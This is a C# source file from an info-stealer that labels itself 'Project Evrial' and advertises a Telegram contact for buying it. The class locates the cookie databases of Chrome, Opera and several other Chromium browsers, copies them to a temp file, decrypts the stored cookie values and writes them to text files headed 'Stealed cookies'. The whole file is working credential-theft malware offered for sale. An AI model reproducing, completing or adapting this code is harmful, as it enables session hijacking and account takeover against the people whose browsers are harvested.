using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace I_See_you
{
    class ChromiumCookie
    {
        public static void ChromiumInitialise(string path)
        {
            string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
            string[] array = new string[]
			{
				environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Cookies",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
				environmentVariable + "\\Kometa\\User Data\\Default\\Cookies",
				environmentVariable + "\\Orbitum\\User Data\\Default\\Cookies",
				environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Cookies",
				environmentVariable + "\\Amigo\\User\\User Data\\Default\\Cookies",
				environmentVariable + "\\Torch\\User Data\\Default\\Cookies"
			};
            string[] array2 = array;
            for (int i = 0; i < array2.Length; i++)
            {
                string text = array2[i];
                try
                {
                    string str = "";
                    if (text.Contains("Chrome"))
                    {
                        str = "Google";
                    }
                    if (text.Contains("Yandex"))
                    {
                        str = "Yandex";
                    }
                    if (text.Contains("Orbitum"))
                    {
                        str = "Orbitum";
                    }
                    if (text.Contains("Opera"))
                    {
                        str = "Opera";
                    }
                    if (text.Contains("Amigo"))
                    {
                        str = "Amigo";
                    }
                    if (text.Contains("Torch"))
                    {
                        str = "Torch";
                    }
                    if (text.Contains("Comodo"))
                    {
                        str = "Comodo";
                    }
                    try
                    {
                        List<Cookie> cookies = GetCookies(text);
                        if (cookies != null)
                        {
                            Directory.CreateDirectory(path + "\\Cookies\\");
                            using (StreamWriter streamWriter = new StreamWriter(path + "\\Cookies\\" + str + "_cookies.txt"))
                            {
                                streamWriter.WriteLine("# ----------------------------------");
                                streamWriter.WriteLine("# Stealed cookies by Project Evrial ");
                                streamWriter.WriteLine("# Developed by Qutra ");
                                streamWriter.WriteLine("# Buy Project Evrial: t.me/Qutrachka");
                                streamWriter.WriteLine("# ----------------------------------\r\n");
                                foreach (Cookie current in cookies)
                                {
                                    if (current.expirationDate == "9223372036854775807")
                                    {
                                        current.expirationDate = "0";
                                    }
                                    if (current.domain[0] != '.')
                                    {
                                        current.hostOnly = "FALSE";
                                    }
                                    streamWriter.Write(string.Concat(new string[]
									{
										current.domain,
										"\t",
										current.hostOnly,
										"\t",
										current.path,
										"\t",
										current.secure,
										"\t",
										current.expirationDate,
										"\t",
										current.name,
										"\t",
										current.value,
										"\r\n"
									}));
                                }
                            }
                        }
                    }
                    catch
                    {
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }
        private static List<Cookie> GetCookies(string basePath)
        {
            if (!File.Exists(basePath))
            {
                return null;
            }
            List<Cookie> result;
            try
            {
                string text = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
                if (File.Exists(text))
                {
                    File.Delete(text);
                }
                File.Copy(basePath, text, true);
                Sqlite sqlite = new Sqlite(text);
                sqlite.ReadTable("cookies");
                List<Cookie> list = new List<Cookie>();
                for (int i = 0; i < sqlite.GetRowCount(); i++)
                {
                    try
                    {
                        string value = string.Empty;
                        try
                        {
                            byte[] bytes = Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlite.GetValue(i, 12)), null);
                            value = Encoding.UTF8.GetString(bytes);
                        }
                        catch (Exception)
                        {
                        }
                        bool flag;
                        bool.TryParse(sqlite.GetValue(i, 6), out flag);
                        list.Add(new Cookie
                        {
                            domain = sqlite.GetValue(i, 1),
                            name = sqlite.GetValue(i, 2),
                            path = sqlite.GetValue(i, 4),
                            expirationDate = sqlite.GetValue(i, 5),
                            secure = flag.ToString().ToUpper(),
                            value = value,
                            hostOnly = "TRUE"
                        });
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }
                result = list;
            }
            catch
            {
                result = new List<Cookie>();
            }
            return result;
        }
    }
}
